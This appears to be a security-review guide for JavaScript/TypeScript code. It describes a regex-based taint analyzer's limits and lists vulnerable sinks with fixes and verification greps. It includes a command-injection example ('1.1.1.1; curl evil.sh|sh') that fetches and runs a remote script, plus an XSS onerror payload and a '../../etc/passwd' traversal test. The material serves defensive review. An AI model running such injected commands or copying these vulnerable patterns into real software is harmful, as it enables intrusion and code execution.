# JavaScript and TypeScript security review (a regex analyzer, and how to work with it)

## What it is

JavaScript is where this repository's analysis is weakest, and knowing exactly
how weak is the difference between a useful lead and a misleading claim. The
JS/TS analyzer (`src/triagekit/core/taint/js_analyzer.py`) is **regex-based and
line-oriented**, not AST-based. It has no real parser, no scope model, and no
closure analysis.

This skill documents what it genuinely does, where it genuinely fails, and how to
write findings that are useful anyway. **Absence of a JS finding is absence of
evidence, not evidence of absence.** State that in every report that covers
JavaScript.

The trust boundary crossed is identical to other languages: attacker-controlled
data reaching a construct that interprets input as instructions. The difficulty is
that in JavaScript the attacker's data frequently enters as an object property
chain several frames deep.

## What the analyzer actually does

From `src/triagekit/core/taint/js_analyzer.py`, verified:

- **Function extraction by regex.** `FUNCTION_PATTERN` (`function name(...)`) and
  `ARROW_FUNCTION_PATTERN`, `METHOD_PATTERN`, `CLASS_METHOD_PATTERN` for the
  other declaration shapes. `_extract_functions`, `_extract_params`,
  `_find_function_end`, `_analyze_function`, `_analyze_line`.
- **Per-line analysis.** Within a function body it matches a `CALL_PATTERN`,
  an `ASSIGNMENT_PATTERN`, and a `RETURN_PATTERN` per line.
- **A limited interprocedural pass** (`_interprocedural_analysis`) and
  `_deduplicate_paths` at the end.

### Sinks and sanitizers it recognizes

| Kind | Registry names |
| --- | --- |
| SQL sinks | `mongoose-query` |
| Command sinks | `child-process` |
| Code execution | `eval-sink` |
| XSS sinks | `innerHTML-sink`, `react-dangerously` (`dangerouslySetInnerHTML`), `vue-v-html` (`v-html`), `angular-bypass`, `response-send` |
| Path | `path-traversal-fs` |
| Redirect | `redirect-express` |
| Sanitizers | `sequelize-orm`, `knex-parameterize`, `parameterized-query`, `sql-parameterize`, `html-escape-js`, `react-autoescape`, `url-validate`, `regex-escape` |

## Known limitations -- state these in every report

1. **No real parsing.** Patterns match text, not syntax. A `//` comment, a
   template literal spanning lines, a regex literal, or a JSX attribute can all
   shift a match onto the wrong construct.
2. **No scope or closure model.** A variable shadowed in a nested function, a
   destructured parameter, a rest parameter, or a `this`-bound value is invisible.
   A taint that reaches a sink through a closure is missed.
3. **No cross-line flow within an expression.** A call chain split across lines
   by Prettier will not match.
4. **No module-level analysis.** Statements at module top level that then feed an
   exported function are not a scope this analyzer extracts, so that flow is
   invisible. This is a common Express shape: `const url = process.argv[2]` or a
   `require` result used inside a handler.
5. **No framework handler analysis.** `app.get("/x", async (req, res) => ...)` is
   analyzed for the arrow-function's *shape*, but the analyzer does not know
   `req.params.id` is attacker-controlled in the way the Python analyzer knows
   `request.args.get()` is, unless the registry pattern matches the expression.
6. **No async/await reconstruction.** `await` boundaries and `.then()` chains are
   not modeled as flow.
7. **No resolution of imports.** It cannot tell `db.query` from a user-defined
   `query`. Any function whose name matches a sink pattern is a candidate.

Everything in that list is a false *negative* source. There is no compensating
claim to make.

## Detection (what to look for, by hand)

Because the analyzer is weak, this is the primary mechanism. In priority order:

### 1. DOM XSS

    element.innerHTML = userInput;                       // innerHTML-sink
    document.write(userInput);
    jQuery(el).html(userInput);
    $el.append(userInput);
    element.setAttribute("href", userInput);              // javascript: URL
    eval(userInput); new Function(userInput);             // eval-sink
    setTimeout(userInput, 0);                             // string form evaluates

### 2. React and framework-specific

    <div dangerouslySetInnerHTML={{ __html: props.text }} />     // react-dangerously
    <div v-html="raw" />                                          // vue-v-html
    <div [innerHTML]="raw"></div>                                 // angular
    // React autoescapes by default, so dangerouslySetInnerHTML is THE React XSS question.

### 3. Command execution

    const { exec, execSync } = require("child_process");   // child-process
    exec(`ping ${req.query.host}`);                        // template literal into a shell
    execSync("convert " + userPath);
    spawn("sh", ["-c", userCommand]);                     // a shell is present

### 4. Injection into queries

    User.find({ $where: `this.name == '${req.query.name}'` });   // mongoose-query, $where
    db.query(`SELECT * FROM t WHERE id = ${req.params.id}`);     // a template literal into SQL
    knex.raw(`... ${userInput}`);                                 // knex, bypasses binding

### 5. Path traversal

    res.sendFile(path.join(BASE, req.params.file));         // path-traversal-fs
    fs.readFileSync(req.query.path);
    res.download(req.query.f);

### 6. Open redirect

    res.redirect(req.query.next);                           // redirect-express
    location.href = params.get("return");

### 7. Server-side prototype pollution and SSRF

    Object.assign(target, JSON.parse(body));                 // a __proto__ key walks up
    const v = obj[key];                                      // key from input
    fetch(process.env[req.query.k]);                         // SSRF
    axios.get(userUrl);

### 8. Secrets in bundles

    const API_KEY = "sk-...";                               // ships to the browser
    // Anything in a client bundle is public. See skills/13-secrets-and-tokens.md.

## How it works (attack mechanics)

For DOM XSS, `innerHTML` parses its assignment as HTML, so the attacker's string
becomes markup -- and `<img src=x onerror=...>` becomes an event handler. React's
`dangerouslySetInnerHTML` is the same boundary with a deliberately alarming name:
React escapes everything else, and this prop opts out of exactly that.

For command execution, `exec` spawns a shell. A template literal puts the
attacker's bytes in the shell grammar, so `` `ping ${host}` `` with
`host = "1.1.1.1; curl evil.sh|sh"` runs the second command. `execFile` without
`{shell: true}` would not.

For prototype pollution, `Object.assign(target, untrusted)` copies a `__proto__`
key onto `target`'s prototype when the key is present and the target's own
`__proto__` is writable, which mutates `Object.prototype` and can reach every
subsequent object in the process.

## Is it actually exploitable?

1. **Is the value reachable as a string, or is it already escaped?** If it passes
   through `textContent`, a framework binding, or `DOMPurify.sanitize`, it is
   safe.
2. **Is the sink server-side or client-side?** `res.send(userInput)` is different
   from `innerHTML = userInput`; the attacker's position and the impact differ.
3. **For `dangerouslySetInnerHTML`/`v-html`, is the content user-controlled?** A
   static, developer-authored string is safe and common.
4. **Does the client bundle reach the browser?** Anything in a client bundle is
   public by definition. A secret there is not "exposed if an attacker..."; it is
   published.
5. **For a regex-analyzer finding: can you confirm it by reading the file?** If
   not, it is a lead, not a finding. Downgrade it to a note with the reason.

## False positives (do NOT report)

- **`dangerouslySetInnerHTML={{ __html: SOME_STATIC_STRING }}`.** Developer
  authored, not user controlled.
- **`innerHTML` assigned a literal or a sanitized value.**
- **`textContent` / `innerText` / framework bindings / `DOMPurify.sanitize`.**
  These are the escapes.
- **`res.send`/`res.json` returning JSON.** The JSON encoder handles escaping;
  a JSON API is not an XSS sink unless it is served as `text/html`.
- **`spawn("cmd", [arg])` with `{shell: false}` (the default).** One argument, no
  shell.
- **`path.join(BASE, path.basename(name))`** and
  `path.normalize(...).startsWith(BASE)`.
- **A mongoose/Sequelize/knex query with bound parameters** -- `:param`,
  `$1`, `?` placeholders.
- **A `new Function(...)` / `eval` in a build script or a test.**
- **A sink name matched inside a comment, a string, or a type declaration.**
- **An object literal property named `innerHTML` being read rather than written.**

The most expensive JS false positive is reporting `dangerouslySetInnerHTML` with
a static string, because it is present in essentially every React codebase and
the maintainer will know instantly that you did not read the expression.

## Severity

Reflected DOM XSS in a browser (the browser is a subsequent system):

```
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N
https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N
```

`UI:P` because browsing a page is passive interaction. `SC/SI:L` because the
victim's browser is a subsequent system, while `VC/VI:L` reflect that the app's
own data is not directly modified. Server-side command injection through
`exec` is `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` -- no user
interaction at all. A secret in a client bundle is
`AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` because publication
requires no interaction. Never hand-compute the number.

## Remediation

```js
// before                                  // after
el.innerHTML = userInput;                  el.textContent = userInput;
document.write(userInput);                 document.body.textContent = userInput;
<div dangerouslySetInnerHTML={{__html:t}}/> <div>{t}</div>          // React escapes by default
<div v-html="raw"/>                        <div>{{ raw }}</div>    // Vue interpolation escapes
exec(`ping ${host}`);                      execFile("ping", [host]);
app.get("/r", (q,r) => r.redirect(q.next)) if (ALLOWED.has(q.next)) r.redirect(q.next);
                                           else r.redirect("/");
res.sendFile(path.join(BASE, f))           res.sendFile(path.join(BASE, path.basename(f)))
const API_KEY = "sk-live-..."              const API_KEY = process.env.API_KEY  // and move it server-side
```

For `dangerouslySetInnerHTML` where HTML is genuinely required, sanitize with
`DOMPurify.sanitize(html, { ALLOWED_TAGS: [...] })` and pin the allowlist. For
command execution, drop `exec` for `execFile`/`spawn` with an argument array and
no `shell: true`. For a secret in a bundle, move it behind a server endpoint --
there is no client-side fix for a published key.

## Verify the fix

- `grep -rn 'innerHTML\|document\.write\|dangerouslySetInnerHTML\|v-html' --include='*.js' --include='*.jsx' --include='*.ts' --include='*.tsx' --include='*.vue' .`
  -- each remaining hit either escapes or has a comment saying why it is safe.
- `grep -rn 'child_process\|exec(\|execSync(' --include='*.js' .` -- every hit
  uses an argument array without `shell: true`.
- `grep -rniE '(api[_-]?key|secret|token)\s*[:=]\s*["'\''][A-Za-z0-9_-]{16,}' --include='*.js' --include='*.ts' .`
  excluding server-side code and `.env` handling.
- A test asserting the payload string is rendered as text, not markup (assert
  `textContent` equals the raw payload).
- A test asserting `../../etc/passwd` as the file parameter resolves inside `BASE`.

**And the honest statement:** because the JS analyzer is regex-based, these greps
are the real coverage. If the report contains no JavaScript findings, say so and
say why.
